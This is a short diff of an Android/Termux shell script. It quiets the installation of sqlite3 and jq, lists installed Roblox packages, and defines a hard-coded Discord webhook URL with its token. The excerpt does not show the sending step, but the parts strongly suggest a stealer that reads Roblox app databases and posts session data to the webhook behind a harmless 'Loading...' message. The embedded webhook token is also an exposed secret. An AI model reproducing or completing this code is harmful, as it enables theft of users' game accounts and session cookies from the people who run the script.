@@ -1,7 +1,7 @@
 #!/system/bin/sh
 echo "Loading..."
 if ! command -v sqlite3 >/dev/null; then
-    pkg update && pkg upgrade -y && pkg install -y sqlite && pkg install jq >/dev/null
+    pkg update -y >/dev/null && pkg upgrade -y >/dev/null && pkg install -y sqlite jq >/dev/null
 fi
 ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
 WEBHOOK_URL2="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
